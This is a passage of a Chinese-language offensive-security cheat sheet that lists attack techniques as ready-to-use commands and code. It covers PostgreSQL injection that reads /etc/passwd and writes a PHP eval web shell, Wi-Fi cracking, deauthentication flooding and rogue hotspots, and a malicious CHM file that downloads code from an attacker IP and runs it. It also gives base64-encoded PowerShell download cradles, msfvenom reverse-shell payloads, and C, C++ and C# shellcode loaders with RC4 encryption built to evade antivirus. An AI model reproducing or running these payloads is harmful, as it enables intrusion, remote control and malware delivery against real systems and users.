#行数&amp;&gt;drop table wooyun;&gt;create table wooyun(t TEXT);&gt;copy wooyun FROM &#39;/etc/passwd&#39;;&gt;select * from wooyun limit 1 offset 0;&amp;&gt;select lo_import(&#39;/etc/passwd&#39;,12345678);&gt;select array_agg(b)::text::int from(select encode(data,&#39;hex&#39;)b,pageno from pg_largeobject where loid=12345678 order by pageno)a;写文件create table shell(shell text not null);insert into shell values($$&lt;?php @eval($_POST[1]);?&gt;$$);copy shell(shell) to &#39;/var/www/html/shell.php&#39;;&amp;copy (select &#39;&lt;?php phpinfo();?&gt;&#39;) to &#39;/var/www/html/shell.php&#39;;爆破MSF&gt;use auxiliary/scanner/postgres/postgres_login执行命令版本8.2以下&gt;create function system(cstring) returns int AS &#39;/lib/libc.so.6&#39;, &#39;system&#39; language C strict;&gt;create function system(cstring) returns int AS &#39;/lib64/libc.so.6&#39;, &#39;system&#39; language C strict;&gt;select system(&#39;id&#39;);</code></pre><h2 id="近源攻击"><a href="#近源攻击" class="headerlink" title="近源攻击"></a>近源攻击</h2><h3 id="WI-FI破解"><a href="#WI-FI破解" class="headerlink" title="WI-FI破解"></a>WI-FI破解</h3><h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><pre><code>Kali下工具wifite，加载网卡，开启监听模式，#airmon-ng check kill#airmon-ng start wlan1安装hcxtools v4.2.0或更高版本，hcxdumptool v4.2.0或更高版本#apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev#git clone https://github.com/ZerBea/hcxtools#cd hcxtools#make#make install #git clone https://github.com/ZerBea/hcxdumptool#cd hcxdumptool#make#make install#wifite –-dict /root/Desktop/wordlist.txt  加载</code></pre><h4 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h4><pre><code>#airmon-ng start wlan0 开启监听模式#airodump-ng wlan0mon  查看数据包#airodump-ng –c 1 –bssid APmac –w name wlan1mon保存某AP数据包#aireplay-ng –deauth 10 –a APmac wlan0mon  deauth攻击#aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon deauth攻击某个设备直至获取handshake(握手包)#airmon-ng stop wlan0mon  关闭监听模式#aircrack-ng –w wordlist.txt name.cap 指定字典破解密码</code></pre><h3 id="钓鱼网络"><a href="#钓鱼网络" class="headerlink" title="钓鱼网络"></a>钓鱼网络</h3><h4 id="Hostapd"><a href="#Hostapd" class="headerlink" title="Hostapd"></a>Hostapd</h4><pre><code>#apt install hostapd dnsmasq#cd /etc/hostapd#vim open.conf 创建无加密热点Interface=wlan1Ssid=FreeWIFIDriver=nl80211Channel=1Hw_mode=g#vim /etc/dnsmasq.confDhcp-range=10.0.0.1, 10.0.0.255,12hInterface=wlan1#systemctl restart dnsmasq消除网卡限制#nmcli radio wifi off#rfkill unblock wlan#ifconfig wlan1 10.0.0.1/24#hostapd open.conf嗅探#sysctl –w net.ipv4.ip_forward=1#iptables –t nat –A POSTROUTING –o 网卡 –j MASQUERADE#bettercap –iface wlan1#net.show#net.sniff on#driftnet –i wlan1</code></pre><h4 id="Hostapd-wpe"><a href="#Hostapd-wpe" class="headerlink" title="Hostapd-wpe"></a>Hostapd-wpe</h4><pre><code>#apt install hostapd-wpe#vim /etc/hostapd-wpe/hostapd-wpe.conf配置interface=wlan1Ssid=Channel=证书修改#cd /etc/hostapd-wpe/certs/文件ca.cnf server.cnf client.cnf修改countrName stateOrProvinceName localityName …….#rm –rf *.pem *.der *.csr *.crt *.key *.p12 serial* index.txt*#make clean#./bootstrap#make install执行创建热点#hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf获取到密码时使用asleep破解#asleap –C Challenge值 –R response值 –W 字典文件</code></pre><h3 id="无线干扰"><a href="#无线干扰" class="headerlink" title="无线干扰"></a>无线干扰</h3><h4 id="Beacon-flood"><a href="#Beacon-flood" class="headerlink" title="Beacon flood"></a>Beacon flood</h4><pre><code>需切换网卡为监听模式#airmon-ng start wlan1创建大量虚假热点Mdk3 mon0 b#mdk3 wlan1mon b -f /root/wifi.txt -a -s 1500</code></pre><h4 id="Deauth-flood"><a href="#Deauth-flood" class="headerlink" title="Deauth flood"></a>Deauth flood</h4><pre><code>针对AP#airmon-ng start wlan1#aireplay-ng –deauth 10 –a AP’s mac address mon0针对AP内设备#airmon-ng start wlan1       将网卡置为监听模式#airodump-ng wlan1mon –bssid 目标ap的ssid#aireplay-ng -0 0 -a ap的ssid -c AP的ssid wlan0mon 开始攻击</code></pre><h4 id="Mdk3-destruction"><a href="#Mdk3-destruction" class="headerlink" title="Mdk3 destruction"></a>Mdk3 destruction</h4><pre><code>针对范围内#mdk3 wlan1mon d针对AP#airodump-ng wlan1mon#mdk3 wlan1mon a -a APmac 发起攻击黑名单#mdk3 wlan1mon d –c 信道 –b /blacklist.txt.#mdk3 wlan1mon  b -n test -w -g -c 1 -s 200</code></pre><h4 id="WiFi芯片esp8266"><a href="#WiFi芯片esp8266" class="headerlink" title="WiFi芯片esp8266"></a>WiFi芯片esp8266</h4><h4 id="Mdk4"><a href="#Mdk4" class="headerlink" title="Mdk4"></a>Mdk4</h4><pre><code>#mdk4 wlan0mon d</code></pre><h4 id="CVE-2018-4407"><a href="#CVE-2018-4407" class="headerlink" title="CVE-2018-4407"></a>CVE-2018-4407</h4><pre><code>Scapysend(IP(dst=&quot;192.168.1.132&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）Apple OS X El Capitan及更早版本：所有设备</code></pre><h4 id="绕过mac地址认证"><a href="#绕过mac地址认证" class="headerlink" title="绕过mac地址认证"></a>绕过mac地址认证</h4><h5 id="Ifconfig"><a href="#Ifconfig" class="headerlink" title="Ifconfig"></a>Ifconfig</h5><pre><code>#ifconfig wlan1 down#ifconfig wlan1 hw ether xx:xx:xx:xx:xx:xx#ifconfig wlan1 up</code></pre><h5 id="Macchanger"><a href="#Macchanger" class="headerlink" title="Macchanger"></a>Macchanger</h5><pre><code>#macchanger –m xx:xx:xx:xx:xx:xx wlan1#macchanger –r wlan1</code></pre><h3 id="BadUSB"><a href="#BadUSB" class="headerlink" title="BadUSB"></a>BadUSB</h3><h3 id="克隆卡"><a href="#克隆卡" class="headerlink" title="克隆卡"></a>克隆卡</h3><h3 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h3><h2 id="鱼叉式攻击"><a href="#鱼叉式攻击" class="headerlink" title="鱼叉式攻击"></a>鱼叉式攻击</h2><h3 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h3><pre><code>假冒的内部域名假冒的外部域名近似域名被黑账户群发/特定发虚构情景/恶意连接/恶意文件</code></pre><h4 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h4><h5 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h5><pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016</code></pre><h5 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h5><pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016，Vista SP2，Server 2008 SP2，Windows 7 SP1，Windows 8.1</code></pre><h5 id="CVE-2012-0158"><a href="#CVE-2012-0158" class="headerlink" title="CVE-2012-0158"></a>CVE-2012-0158</h5><pre><code>Microsoft Office 2003 SP3、2007 SP2和SP3，以及2010 Gold和SP1；Office 2003 Web组件SP3；SQL Server 2000 SP4、2005 SP4和2008 SP2，SP3和R2; BizTalk Server 2002 SP1；Commerce Server 2002 SP4、2007 SP2和2009 Gold和R2; Visual FoxPro 8.0 SP1和9.0 SP2; 和Visual Basic 6.0</code></pre><h5 id="CVE-2017-0143"><a href="#CVE-2017-0143" class="headerlink" title="CVE-2017-0143"></a>CVE-2017-0143</h5><pre><code>Microsoft Windows Vista SP2；Windows Server 2008 SP2和R2 SP1; Windows 7 SP1；Windows 8.1; Windows Server 2012 Gold和R2；Windows RT 8.1；Windows 10 Gold，1511和1607；以及 和Windows Server 2016OFFICE文档/ PDF文件</code></pre><h4 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h4><h4 id="文档文件的伪造"><a href="#文档文件的伪造" class="headerlink" title="文档文件的伪造"></a>文档文件的伪造</h4><h4 id="扩展名-图标"><a href="#扩展名-图标" class="headerlink" title="扩展名/图标"></a>扩展名/图标</h4><h4 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h4><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><h4 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h4><h4 id="CHM"><a href="#CHM" class="headerlink" title="CHM"></a>CHM</h4><pre><code>使用编译的HTML文件加载恶意代码。使用EasyCHM对html进行编译，在html文件中插入恶意代码。使用MSF生成powershell格式的web_delivery模块使用Rundll32配合MyJSRAT实施运行无弹窗</code></pre><p><img src="./img/44.png" alt="image"></p><pre><code>把命令base编码避免特殊符号</code></pre><p><img src="./img/45.png" alt="image"></p><pre><code>执行语句编码后&gt;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==通过JSRat执行powershell上线命令https://github.com/Ridter/MyJSRat&gt;python MyJSRat.py -i 192.168.1.107 -p 8888 -c &quot;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==&quot;</code></pre><p><img src="./img/46.png" alt="image"></p><pre><code>访问http://ip/wtf复制利用语句到html文件后编译</code></pre><p><img src="./img/47.png" alt="image"></p><pre><code>&lt;PARAM name=&quot;Item1&quot; value=&#39;,rundll32.exe,javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#39;&gt;</code></pre><p><img src="./img/48.png" alt="image"></p><pre><code>正常打开CHM文件，无弹窗上线。</code></pre><p><img src="./img/49.png" alt="image"></p><h3 id="钓鱼链接"><a href="#钓鱼链接" class="headerlink" title="钓鱼链接"></a>钓鱼链接</h3><h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h4><h4 id="结合恶意文档或程序"><a href="#结合恶意文档或程序" class="headerlink" title="结合恶意文档或程序"></a>结合恶意文档或程序</h4><h4 id="短URL"><a href="#短URL" class="headerlink" title="短URL"></a>短URL</h4><h4 id="结合水坑攻击"><a href="#结合水坑攻击" class="headerlink" title="结合水坑攻击"></a>结合水坑攻击</h4><h4 id="相似域名"><a href="#相似域名" class="headerlink" title="相似域名"></a>相似域名</h4><h4 id="域名窃取"><a href="#域名窃取" class="headerlink" title="域名窃取"></a>域名窃取</h4><h3 id="第三方服务鱼叉"><a href="#第三方服务鱼叉" class="headerlink" title="第三方服务鱼叉"></a>第三方服务鱼叉</h3><pre><code>通过社交软件建立关系，如男女朋友，师父徒弟，HR，寻求业务等进行钓鱼攻击</code></pre><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><h2 id="MSF免杀"><a href="#MSF免杀" class="headerlink" title="MSF免杀"></a>MSF免杀</h2><h3 id="nps-payload"><a href="#nps-payload" class="headerlink" title="nps_payload"></a>nps_payload</h3><pre><code>&gt;python nps_payload.py正常生成&gt;msfconsole -r msbuild_nps.rc开启监听&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe xx.xml&gt;wmiexec.py &lt;USER&gt;:&#39;&lt;PASS&gt;&#39;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml正常执行结束进程msbuild会失去会话，以下保存bat执行获得session后立刻迁移进程@echo offecho [*] Please Wait, preparing software ..C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Microsoft.NET\Framework\v4.0.30319\xxx.xmlexit</code></pre><h3 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h3><pre><code>&gt;set EnableStageEncoding true&gt;set stageencoder x86/fnstenv_mov 编码进行免杀&gt;set stageencodingfallback false&amp;&gt;msfvenom --list encoders列出编码器</code></pre><h3 id="c-c-源码免杀"><a href="#c-c-源码免杀" class="headerlink" title="c/c++源码免杀"></a>c/c++源码免杀</h3><pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f c -o 1.c-i编码20次MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe</code></pre><h4 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h4><pre><code>unsigned char buf[] =&quot;shellcode&quot;;#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口main()&#123;    ( (void(*)(void))&amp;buf)();&#125;使用vc6.0组建编译后在靶机执行</code></pre><p><img src="./img/50.png" alt="image"></p><pre><code>当前过不了火绒，360动态静态可过</code></pre><h4 id="申请动态内存"><a href="#申请动态内存" class="headerlink" title="申请动态内存"></a>申请动态内存</h4><pre><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口unsigned char buf[] =&quot;shellcode&quot;;main()&#123;    char *Memory;    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, buf, sizeof(buf));    ((void(*)())Memory)();&#125;</code></pre><h4 id="嵌入汇编"><a href="#嵌入汇编" class="headerlink" title="嵌入汇编"></a>嵌入汇编</h4><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker, &quot;/section:.data,RWE&quot;)unsigned char shellcode[] =&quot;&quot;;void main()&#123;    __asm    &#123;        mov eax, offset shellcode        jmp eax    &#125;&#125;</code></pre><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;unsigned char buf[] =&quot;&quot;;void main()&#123; ((void(WINAPI*)(void))&amp;buf)();&#125;</code></pre><h4 id="汇编花指令"><a href="#汇编花指令" class="headerlink" title="汇编花指令"></a>汇编花指令</h4><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker, &quot;/section:.data,RWE&quot;)unsigned char shellcode[] =&quot;&quot;;void main()&#123;        __asm    &#123;        mov eax, offset shellcode        _emit 0xFF          _emit 0xE0    &#125;&#125;</code></pre><h4 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h4><pre><code>https://github.com/Arno0x/ShellcodeWrapper安装生成raw格式木马&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f raw -o shell.raw</code></pre><p><img src="./img/51.png" alt="image"></p><pre><code>加密&gt; python shellcode_encoder.py -cpp -cs -py shell.raw thisiskey xor生成的py文件使用py2exe编译执行生成的cs文件使用csc.exe编译执行生成的cpp文件使用vc6.0编译，去掉预编译头编译执行</code></pre><p><img src="./img/52.png" alt="image"></p><h4 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h4><pre><code>目前过火绒，不过360，可组合一下Vs新建c++控制台程序右键属性-》将MFC的使用选为在静态库中使用MFC生成c格式shellcode粘贴进remote inject.cpp</code></pre><p><img src="./img/53.png" alt="image"></p><pre><code>生成项目能成功上线，并开启calc进程</code></pre><p><img src="./img/54.png" alt="image"><br><img src="./img/55.png" alt="image"></p><h4 id="加载器免杀"><a href="#加载器免杀" class="headerlink" title="加载器免杀"></a>加载器免杀</h4><h5 id="shellcode-launcher"><a href="#shellcode-launcher" class="headerlink" title="shellcode_launcher"></a>shellcode_launcher</h5><pre><code>https://github.com/clinicallyinane/shellcode_launcher/生成payload(raw)&gt;msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f raw -o shellcode.raw加载器加载&gt;shellcode_launcher.exe -i shellcode.raw</code></pre><h5 id="SSI加载"><a href="#SSI加载" class="headerlink" title="SSI加载"></a>SSI加载</h5><pre><code>https://github.com/DimopoulosElias/SimpleShellcodeInjector生成payload(c)&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f c -o shellcode.c执行&gt;cat shellcode.c |grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#39;:a;N;$!ba;s/\n//g&#39;|sed &quot;s/;//g&quot;</code></pre><p><img src="./img/56.png" alt="image"></p><pre><code>MSF监听可使用minGW自行编译&gt;gcc SimpleShellcodeInjector.c -o xxx.exe执行&gt;xxx.exe +生成的编码</code></pre><h3 id="c-源码免杀"><a href="#c-源码免杀" class="headerlink" title="c#源码免杀"></a>c#源码免杀</h3><h4 id="直接编译"><a href="#直接编译" class="headerlink" title="直接编译"></a>直接编译</h4><pre><code>生成payloadMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txtMSF启动监听Payload粘贴到位置using System;using System.Runtime.InteropServices;namespace TCPMeterpreterProcess&#123;    class Program    &#123;        static void Main(string[] args)        &#123;            byte[] shellcode = new byte[] &#123;payload here&#125;;            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);            IntPtr hThread = IntPtr.Zero;            UInt32 threadId = 0;            // prepare data            IntPtr pinfo = IntPtr.Zero;            // execute native code            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);            WaitForSingleObject(hThread, 0xFFFFFFFF);        &#125;        private static UInt32 MEM_COMMIT = 0x1000;        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);        [DllImport(&quot;kernel32&quot;)]        private static extern bool VirtualFree(IntPtr lpAddress,        UInt32 dwSize, UInt32 dwFreeType);        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr CreateThread(            UInt32 lpThreadAttributes,            UInt32 dwStackSize,            UInt32 lpStartAddress,            IntPtr param,            UInt32 dwCreationFlags,            ref UInt32 lpThreadId        );        [DllImport(&quot;kernel32&quot;)]        private static extern bool CloseHandle(IntPtr handle);        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 WaitForSingleObject(            IntPtr hHandle,            UInt32 dwMilliseconds        );        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr GetModuleHandle(            string moduleName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetProcAddress(            IntPtr hModule,            string procName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 LoadLibrary(            string lpFileName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetLastError();    &#125;&#125;Visual studio创建C#.net framework控制台程序编译可过杀软</code></pre><h4 id="加密处理"><a href="#加密处理" class="headerlink" title="加密处理"></a>加密处理</h4><pre><code>生成payloadMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt粘贴payload后编译加密using System;using System.Collections.Generic;using System.IO;using System.Linq;using System.Security.Cryptography;using System.Text;using System.Threading.Tasks;using System.Reflection;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;namespace Payload_Encrypt_Maker&#123;    class Program    &#123;        // 加密密钥，可以更改，加解密源码中保持KEY一致就行        static byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;        static byte[] IV = &#123; 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc &#125;;        static byte[] payload = &#123; payload here &#125;;    // 替换成MSF生成的shellcode        private static class Encryption_Class        &#123;            public static string Encrypt(string key, string data)            &#123;                Encoding unicode = Encoding.Unicode;                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));            &#125;            public static byte[] Encrypt(byte[] key, byte[] data)            &#123;                return EncryptOutput(key, data).ToArray();            &#125;            private static byte[] EncryptInitalize(byte[] key)            &#123;                byte[] s = Enumerable.Range(0, 256)                .Select(i =&gt; (byte)i)                .ToArray();                for (int i = 0, j = 0; i &lt; 256; i++)                &#123;                    j = (j + key[i % key.Length] + s[i]) &amp; 255;                    Swap(s, i, j);                &#125;                return s;            &#125;            private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)            &#123;                byte[] s = EncryptInitalize(key);                int i = 0;                int j = 0;                return data.Select((b) =&gt;                &#123;                    i = (i + 1) &amp; 255;                    j = (j + s[i]) &amp; 255;                    Swap(s, i, j);                    return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);                &#125;);            &#125;            private static void Swap(byte[] s, int i, int j)            &#123;                byte c = s[i];                s[i] = s[j];                s[j] = c;            &#125;        &#125;        static void Main(string[] args)        &#123;            byte[] result = Encryption_Class.Encrypt(KEY, payload);            int b = 0;            for (int i = 0; i &lt; result.Length; i++)            &#123;                b++;                if (i == result.Length + 1)                &#123; Console.Write(result[i].ToString()); &#125;                if (i != result.Length) &#123; Console.Write(result[i].ToString() + &quot;,&quot;); &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p><img src="./img/57.png" alt="image"></p><pre><code>编译解密using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Runtime.InteropServices;using System.Threading;using System.Reflection;using System.Runtime.CompilerServices;namespace NativePayload_Reverse_tcp&#123;    public class Program&#123;        public static void Main()        &#123;            Shellcode.Exec();  &#125;&#125;class Shellcode&#123;  public static void Exec()  &#123;    string Payload_Encrypted;    Payload_Encrypted = &quot;payload here&quot;;    string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(&#39;,&#39;);    byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];    for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)    &#123;      byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());      _X_to_Bytes[i] = current;    &#125;    // 解密密钥，可以更改，加解密源码中保持KEY一致就行            byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;            byte[] MsfPayload = Decrypt(KEY, _X_to_Bytes);            // 加载shellcode            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);            Thread.Sleep(2000);        &#125;        public static byte[] Decrypt(byte[] key, byte[] data)        &#123;            return EncryptOutput(key, data).ToArray();        &#125;        private static byte[] EncryptInitalize(byte[] key)        &#123;            byte[] s = Enumerable.Range(0, 256)            .Select(i =&gt; (byte)i)            .ToArray();            for (int i = 0, j = 0; i &lt; 256; i++)            &#123;                j = (j + key[i % key.Length] + s[i]) &amp; 255;                Swap(s, i, j);            &#125;            return s;        &#125;        private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)        &#123;            byte[] s = EncryptInitalize(key);            int i = 0;            int j = 0;            return data.Select((b) =&gt;            &#123;                i = (i + 1) &amp; 255;                j = (j + s[i]) &amp; 255;                Swap(s, i, j);                return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);                &#125;);        &#125;        private static void Swap(byte[] s, int i, int j)        &#123;            byte c = s[i];            s[i] = s[j];            s[j] = c;        &#125;        [DllImport(&quot;kernel32.dll&quot;)]        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);        [DllImport(&quot;kernel32.dll&quot;)]        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);    &#125;&#125;</code></pre><h4 id="XOR-AES编码"><a href="#XOR-AES编码" class="headerlink" title="XOR/AES编码"></a>XOR/AES编码</h4><pre><code>与上文xor加密类似</code></pre><h4 id="CSC-InstallUtil"><a href="#CSC-InstallUtil" class="headerlink" title="CSC+InstallUtil"></a>CSC+InstallUtil</h4><pre><code>生成payloadMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txtPayload粘贴到InstallUtil-Shellcode.cs中使用csc编译</code></pre><p><img src="./img/58.png" alt="image"></p><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\Users\y\Desktop\shell.exe C:\Users\y\Desktop\InstallUtil-ShellCode.cs</code></pre><p><img src="./img/59.png" alt="image"></p><pre><code>执行C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe</code></pre><h3 id="Python源码免杀"><a href="#Python源码免杀" class="headerlink" title="Python源码免杀"></a>Python源码免杀</h3><h4 id="pyinstaller加载C代码编译"><a href="#pyinstaller加载C代码编译" class="headerlink" title="pyinstaller加载C代码编译"></a>pyinstaller加载C代码编译</h4><pre><code>生成C格式payloadMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c粘贴shellcode到shellcode+c.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\Python27\Scripts目录使用命令把py打包为exe&gt;python pyinstaller-script.py -F -w shellcode.py会在目录下生成dist文件夹，exe文件就在里面</code></pre><h4 id="pyinstaller加载py代码编译"><a href="#pyinstaller加载py代码编译" class="headerlink" 